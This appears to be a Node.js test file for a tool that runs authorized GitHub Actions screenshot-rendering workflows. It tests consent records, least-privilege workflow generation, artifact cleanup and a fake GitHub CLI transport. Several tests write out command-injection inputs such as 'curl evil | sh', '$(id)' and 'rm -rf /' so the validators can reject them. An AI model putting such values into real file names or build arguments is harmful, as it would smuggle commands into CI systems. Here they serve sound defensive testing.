import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import { AuthorizationError, checkAuthorization, createAuthorization, describeRemoteExecution } from "../src/consent.mjs";
import { buildWorkflow, executeHosted, ghCliTransport, HostedRunError } from "../src/hosted.mjs";
import { SHA, SHA2, makeTree, spyTransport } from "./helpers.mjs";

const NOW = new Date("2026-11-11T12:00:00Z");
const plan = { repository: "acme/ios-app", revision: SHA, workflow: "dumbass-render.yml", platform: "macos", method: "swiftui-render", retentionDays: 3, ref: "main", artifactName: "dumbass-render-1" };
const authorize = (overrides = {}) => createAuthorization({ id: "auth-1", ...plan, now: NOW, ...overrides });
const at = (minutes) => new Date(NOW.getTime() + minutes * 60_000);

// ---- authorization records
test("an authorization names the exact repository, revision, workflow, runner and retention", () => {
  const a = authorize();
  assert.deepEqual([a.repository, a.revision, a.workflow, a.platform, a.method, a.retention_days], ["acme/ios-app", SHA, "dumbass-render.yml", "macos", "swiftui-render", 3]);
  assert.equal(a.granted_by, "user");
  assert.deepEqual(a.grants, { source_transfer: true, remote_execution: true, artifact_retrieval: true });
  assert.equal(checkAuthorization(a, plan, { now: at(5) }).ok, true);
});

test("an authorization cannot be created with a branch name, a bad repository, or unbounded retention", () => {
  assert.throws(() => authorize({ revision: "main" }), /40-character commit SHA/);
  assert.throws(() => authorize({ repository: "not a repo" }), /owner\/name/);
  assert.throws(() => authorize({ retentionDays: 365 }), /retention/);
  assert.throws(() => authorize({ retentionDays: 0 }), /retention/);
  assert.throws(() => authorize({ workflow: "../x.yml" }), /workflow/);
});

test("authorization expires", () => {
  const a = authorize({ validHours: 1 });
  assert.equal(checkAuthorization(a, plan, { now: at(30) }).ok, true);
  const late = checkAuthorization(a, plan, { now: at(61) });
  assert.equal(late.ok, false);
  assert.match(late.problems.join(" "), /expired/);
});

test("approval for one revision, repository, workflow, runner or method cannot be reused for another", () => {
  const a = authorize();
  for (const change of [{ revision: SHA2 }, { repository: "acme/other" }, { workflow: "other.yml" }, { platform: "linux" }, { method: "paparazzi" }]) {
    const result = checkAuthorization(a, { ...plan, ...change }, { now: at(1) });
    assert.equal(result.ok, false, JSON.stringify(change));
  }
  assert.equal(checkAuthorization(a, { ...plan, retentionDays: 30 }, { now: at(1) }).ok, false, "longer retention than approved");
});

test("a record that is missing grants, not from the user, or absent is rejected", () => {
  const a = authorize();
  assert.equal(checkAuthorization(undefined, plan, { now: at(1) }).ok, false);
  assert.equal(checkAuthorization({ ...a, grants: { ...a.grants, source_transfer: false } }, plan, { now: at(1) }).ok, false);
  assert.equal(checkAuthorization({ ...a, grants: { ...a.grants, remote_execution: false } }, plan, { now: at(1) }).ok, false);
  assert.equal(checkAuthorization({ ...a, grants: { ...a.grants, artifact_retrieval: false } }, plan, { now: at(1) }).ok, false);
  assert.equal(checkAuthorization({ ...a, granted_by: "agent" }, plan, { now: at(1) }).ok, false);
  assert.equal(checkAuthorization({ ...a, expires_at: "2099-01-01T00:00:00Z" }, plan, { now: at(1) }).ok, false, "unbounded validity");
});

test("the disclosure lists every consequential effect before consent", () => {
  const text = describeRemoteExecution({ ...plan, commands: ["swiftui-render render Login.swift"], screens: ["login"] }).join("\n");
  for (const must of [SHA, "acme/ios-app", "dumbass-render.yml", "macOS runner", "private workflow artifacts", "3 day", "never pushes", "No secrets|none are passed", "Cleanup"]) {
    assert.match(text, new RegExp(must), must);
  }
});

// ---- nothing remote happens without approval
test("no workflow lookup, dispatch or download happens without authorization", async () => {
  for (const bad of [undefined, null, {}, { ...authorize(), granted_by: "agent" }]) {
    const { transport, calls } = spyTransport();
    await assert.rejects(() => executeHosted({ authorization: bad, plan, transport, directory: "/tmp/unused", now: NOW }), AuthorizationError);
    assert.deepEqual(calls, [], "the transport must not be touched, so no source transfer or execution can begin");
  }
});

test("an expired or mismatched authorization starts nothing", async () => {
  const { transport, calls } = spyTransport();
  await assert.rejects(() => executeHosted({ authorization: authorize({ validHours: 1 }), plan, transport, directory: "/tmp/unused", now: at(120) }), /expired/);
  await assert.rejects(() => executeHosted({ authorization: authorize(), plan: { ...plan, revision: SHA2 }, transport, directory: "/tmp/unused", now: NOW }), /different revision/);
  assert.deepEqual(calls, []);
});

test("an authorized run dispatches the approved revision, downloads, then deletes the remote artifact", async () => {
  const { transport, calls } = spyTransport();
  const result = await executeHosted({ authorization: authorize(), plan, transport, directory: await makeTree({}), now: NOW });
  assert.deepEqual(calls.map((c) => c.name), ["workflowExists", "dispatch", "waitForRun", "download", "deleteArtifact"]);
  assert.equal(calls[1].args.revision, SHA);
  assert.deepEqual(result.provenance, { provider: "github-actions", repository: "acme/ios-app", revision: SHA, workflow: "dumbass-render.yml", run_id: "9001", authorization_id: "auth-1" });
  assert.equal(result.cleanup.remoteArtifactDeleted, true);
});

test("a workflow that is not already committed at the revision is never created for the user", async () => {
  const { transport, calls } = spyTransport({ workflowExists: async () => false });
  await assert.rejects(() => executeHosted({ authorization: authorize(), plan, transport, directory: "/tmp/dl", now: NOW }), /does not create or push workflows/);
  assert.deepEqual(calls.map((c) => c.name), ["workflowExists"]);
});

test("a failed run is reported, never treated as success, and the remote artifact is still deleted", async () => {
  const { transport, calls } = spyTransport({ waitForRun: async () => ({ conclusion: "failure" }) });
  await assert.rejects(() => executeHosted({ authorization: authorize(), plan, transport, directory: "/tmp/dl", now: NOW }), (error) => error instanceof HostedRunError && /failure/.test(error.message));
  assert.ok(calls.some((c) => c.name === "deleteArtifact"), "cleanup runs even when the run failed");
  assert.equal(calls.some((c) => c.name === "download"), false);
});

test("a cleanup failure is reported without hiding the downloaded result", async () => {
  const { transport } = spyTransport({ deleteArtifact: async () => { throw new Error("API unavailable"); } });
  const result = await executeHosted({ authorization: authorize(), plan, transport, directory: await makeTree({}), now: NOW });
  assert.equal(result.cleanup.remoteArtifactDeleted, false);
  assert.match(result.cleanup.remoteArtifactDeleteError, /API unavailable/);
});

// ---- workflow generation
const swiftSpec = { kind: "macos-swiftui-render", retentionDays: 3, artifactName: "dumbass-render-1", swiftuiRenderRevision: SHA, screens: [{ id: "login", file: "Previews/Login.swift", theme: "dark" }, { id: "home", file: "Previews/Home.swift" }] };

test("the generated macOS workflow is least-privilege, manual-only, secret-free and pinned", () => {
  const { yaml } = buildWorkflow(swiftSpec);
  assert.match(yaml, /on:\n  workflow_dispatch:/);
  assert.doesNotMatch(yaml, /pull_request|push:|schedule:/, "must not start from untrusted pull requests");
  assert.match(yaml, /permissions:\n  contents: read\n/);
  assert.doesNotMatch(yaml, /secrets\.|GITHUB_TOKEN|id-token|write-all|contents: write/);
  assert.match(yaml, /persist-credentials: false/);
  assert.match(yaml, new RegExp(`checkout --quiet ${SHA}`), "the renderer is pinned to the reviewed commit");
  assert.match(yaml, /retention-days: 3/);
  assert.match(yaml, /if-no-files-found: error/);
  assert.match(yaml, /test "\$\(git rev-parse HEAD\)" = "\$EXPECTED_SHA"/, "the run verifies it is executing the authorized revision");
  assert.match(yaml, /Clean up\n        if: always\(\)/);
  assert.doesNotMatch(yaml, /printenv|\benv\b\s*$|set -x|echo \$\{\{ *secrets/m, "no step may print the environment or enable tracing");
});

test("the Xcode version is not hardcoded unless the caller supplies a reviewed one", () => {
  assert.doesNotMatch(buildWorkflow(swiftSpec).yaml, /xcode-select/);
  assert.match(buildWorkflow({ ...swiftSpec, xcodeVersion: "16.2" }).yaml, /Xcode_16\.2\.app/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, xcodeVersion: "16.2; curl x" }), /Invalid Xcode version/);
});

test("the swiftui-render revision must be an explicit full SHA; there is no default", () => {
  const { swiftuiRenderRevision: _omit, ...without } = swiftSpec;
  assert.throws(() => buildWorkflow(without), /swiftui-render revision/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, swiftuiRenderRevision: "main" }), /swiftui-render revision/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, swiftuiRenderRevision: "0125409" }), /swiftui-render revision/);
});

test("untrusted-looking values cannot be injected into the workflow", () => {
  for (const file of ["Login.swift; curl evil | sh", "../../etc/x.swift", "/abs/Login.swift", "a b.swift", "x$(id).swift", "x`id`.swift"]) {
    assert.throws(() => buildWorkflow({ ...swiftSpec, screens: [{ id: "a", file }] }), /Invalid screen file/, file);
  }
  assert.throws(() => buildWorkflow({ ...swiftSpec, screens: [{ id: "a'b", file: "A.swift" }] }), /Invalid screen id/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, screens: [{ id: "a", file: "A.swift" }, { id: "a", file: "B.swift" }] }), /Duplicate/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, artifactName: "x\nrun: evil" }), /Invalid artifact name/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, screens: [{ id: "a", file: "A.swift", device: "iphone --evil" }] }), /Invalid device/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, retentionDays: 400 }), /Retention/);
  assert.throws(() => buildWorkflow({ ...swiftSpec, screens: [] }), /At least one screen/);
});

const gradleSpec = { kind: "linux-gradle", retentionDays: 2, artifactName: "dumbass-render-2", gradle: { tool: "mugshot", module: "app", moduleDir: "app", javaVersion: "21" } };

test("the Linux workflow records fresh snapshots only, with the same safety properties", () => {
  const { yaml, commands } = buildWorkflow(gradleSpec);
  assert.match(yaml, /java-version: '21'/);
  assert.match(yaml, /rm -rf 'app\/src\/test\/snapshots'/, "stale committed images are removed so only new output is returned");
  assert.deepEqual(commands, ["./gradlew --no-daemon :app:recordMugshotDebug"]);
  assert.match(yaml, /permissions:\n  contents: read/);
  assert.doesNotMatch(yaml, /pull_request|secrets\./);
  assert.throws(() => buildWorkflow({ ...gradleSpec, gradle: { ...gradleSpec.gradle, module: "app; rm -rf /" } }), /Invalid gradle module/);
  assert.throws(() => buildWorkflow({ ...gradleSpec, gradle: { ...gradleSpec.gradle, moduleDir: "../x" } }), /Invalid module directory/);
  assert.throws(() => buildWorkflow({ ...gradleSpec, gradle: { ...gradleSpec.gradle, tool: "other" } }), /Unknown gradle tool/);
});

// ---- GitHub CLI transport (fake gh; the real CLI is never run)
test("the gh transport passes arguments as an array and never shells out", async () => {
  const seen = [];
  const gh = async (args) => {
    seen.push(args);
    if (args[0] === "run" && args[1] === "list") return { stdout: JSON.stringify([{ databaseId: 42, createdAt: new Date().toISOString(), headSha: SHA }]) };
    if (args[0] === "run" && args[1] === "view") return { stdout: JSON.stringify({ conclusion: "success" }) };
    if (args[0] === "api" && args[1].endsWith("/artifacts")) return { stdout: "7\n" };
    return { stdout: "" };
  };
  const t = ghCliTransport(gh);
  assert.equal(await t.workflowExists({ repository: "acme/ios-app", workflow: "dumbass-render.yml", revision: SHA }), true);
  const { runId } = await t.dispatch({ repository: "acme/ios-app", workflow: "dumbass-render.yml", ref: "main", revision: SHA });
  assert.equal(runId, "42");
  assert.deepEqual((await t.waitForRun({ repository: "acme/ios-app", runId })).conclusion, "success");
  assert.equal(await t.deleteArtifact({ repository: "acme/ios-app", runId, artifactName: "dumbass-render-1" }), true);
  assert.ok(seen.every((args) => Array.isArray(args) && args.every((a) => typeof a === "string")));
  assert.ok(seen.some((a) => a.includes(`expected_sha=${SHA}`)));
  assert.ok(seen.some((a) => a[0] === "api" && a.includes("-X") && a.includes("DELETE")));
  assert.equal(JSON.stringify(seen).includes("token"), false, "no credential is handled or passed");
});

test("the gh transport reports a missing workflow as absent and rejects an unsafe artifact name", async () => {
  const t = ghCliTransport(async () => { throw new Error("404"); });
  assert.equal(await t.workflowExists({ repository: "acme/ios-app", workflow: "x.yml", revision: SHA }), false);
  await assert.rejects(() => ghCliTransport(async () => ({ stdout: "" })).deleteArtifact({ repository: "acme/ios-app", runId: "1", artifactName: 'x" or true' }), /Invalid artifact name/);
});

test("a run that cannot be identified at the authorized revision is refused", async () => {
  const gh = async (args) => (args[0] === "run" && args[1] === "list" ? { stdout: JSON.stringify([{ databaseId: 1, createdAt: new Date().toISOString(), headSha: SHA2 }]) } : { stdout: "" });
  const original = global.setTimeout;
  global.setTimeout = (fn) => original(fn, 0);
  try {
    await assert.rejects(() => ghCliTransport(gh).dispatch({ repository: "acme/ios-app", workflow: "x.yml", ref: "main", revision: SHA }), /could not be identified/);
  } finally { global.setTimeout = original; }
});

test("the source for the hosted module contains no hardcoded token handling", async () => {
  const source = await readFile(new URL("../src/hosted.mjs", import.meta.url), "utf8");
  assert.doesNotMatch(source, /process\.env|GITHUB_TOKEN|GH_TOKEN|Authorization:/);
});
